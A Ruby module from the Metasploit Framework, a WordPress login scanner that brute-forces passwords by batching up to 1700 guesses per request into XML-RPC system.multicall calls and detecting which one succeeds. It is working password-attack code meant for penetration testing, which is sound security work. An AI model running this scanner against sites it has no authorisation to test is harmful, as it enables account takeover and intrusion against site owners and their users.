require 'metasploit/framework/login_scanner/http'
require 'nokogiri'

module Metasploit
  module Framework
    module LoginScanner

      class WordpressMulticall < HTTP

        # @!attribute passwords
        # @return [Array]
        attr_accessor :passwords

        # @!attribute chunk_size, limits number of passwords per XML request
        # @return [Integer]
        attr_accessor :chunk_size

        # @!attribute block_wait, time to wait if got blocked by the target
        # @return [Integer]
        attr_accessor :block_wait

        # @!attribute base_uri
        # @return [String]
        attr_accessor :base_uri

        # @!attribute wordpress_url_xmlrpc
        # @return [String]
        attr_accessor :wordpress_url_xmlrpc


        def set_default
          @wordpress_url_xmlrpc ||= 'xmlrpc.php'
          @block_wait ||= 6
          @base_uri ||= '/'
          @chunk_size ||= 1700
        end

        # Checks if the target is a WordPress site with XML-RPC enabled
        #
        # @return [false] if the target looks like WordPress with XML-RPC
        # @return [String] a human-readable error message if it doesn't
        def check_setup
          set_default
          xmlrpc_uri = normalize_uri(base_uri, wordpress_url_xmlrpc)
          res = send_request({
            'method' => 'GET',
            'uri'    => xmlrpc_uri
          })

          return 'Unable to connect to the WordPress XML-RPC endpoint' unless res
          return 'Unable to locate WordPress XML-RPC endpoint (Is WordPress installed and is XML-RPC enabled?)' unless res.code == 200 && res.body.include?('XML-RPC server accepts POST requests only')

          report_service(service_opts)

          false
        end

        def service_opts
          build_service_opts('wordpress')
        end

        # Returns the XML data that is used for the login.
        #
        # @param user [String] username
        # @return [Array]
        def generate_xml(user)
          xml_payloads = []

          # Evil XML | Limit number of log-ins to CHUNKSIZE/request due
          # Wordpress limitation which is 1700 maximum.
          passwords.each_slice(chunk_size) do |pass_group|
            document = Nokogiri::XML::Builder.new do |xml|
              xml.methodCall {
                xml.methodName("system.multicall")
                xml.params {
                xml.param {
                xml.value {
                xml.array {
                xml.data {
                pass_group.each  do |pass|
                  xml.value  {
                  xml.struct {
                  xml.member {
                  xml.name("methodName")
                  xml.value  { xml.string("wp.getUsersBlogs") }}
                  xml.member {
                  xml.name("params")
                  xml.value {
                  xml.array {
                  xml.data  {
                  xml.value {
                  xml.array {
                  xml.data  {
                  xml.value { xml.string(user) }
                  xml.value { xml.string(pass) }
                  }}}}}}}}}
                end
                }}}}}}
            end
            xml_payloads << document.to_xml
          end

          xml_payloads
        end

        # Sends an HTTP request to Wordpress.
        #
        # @param xml [String] XML data.
        # @return [void]
        def send_wp_request(xml)
          opts =
            {
              'method'  => 'POST',
              'uri'     => normalize_uri("#{base_uri}/#{wordpress_url_xmlrpc}"),
              'data'    => xml,
              'ctype'   =>'text/xml'
            }

          res  = send_request(opts)

          if res && res.code != 200
            sleep(block_wait * 60)
          end

          @res = res
        end


        # Attempts to login.
        #
        # @param credential [Metasploit::Framework::Credential]
        # @return [Metasploit::Framework::LoginScanner::Result]
        def attempt_login(credential)
          set_default
          @passwords ||= [credential.private]
          generate_xml(credential.public).each do |xml|
            send_wp_request(xml)
            req_xml = Nokogiri::Slop(xml)
            res_xml = Nokogiri::Slop(@res.to_s.scan(/<.*>/).join)
            res_xml.search("methodResponse/params/param/value/array/data/value").each_with_index do |value, i|
              result =  value.at("struct/member/value/int")
              if result.nil?
                pass = req_xml.search("data/value/array/data")[i].value[1].text.strip
                credential.private = pass
                result_opts = {
                  credential: credential,
                  **service_as_result(service_opts)
                }
                result_opts.merge!(status: Metasploit::Model::Login::Status::SUCCESSFUL)
                return Result.new(result_opts)
              end
            end
          end

          result_opts = {
            credential: credential,
            **service_as_result(service_opts)
          }

          result_opts.merge!(status: Metasploit::Model::Login::Status::INCORRECT)
          return Result.new(result_opts)
        end

        def service_opts
          build_service_opts('wordpress')
        end

      end
    end
  end
end


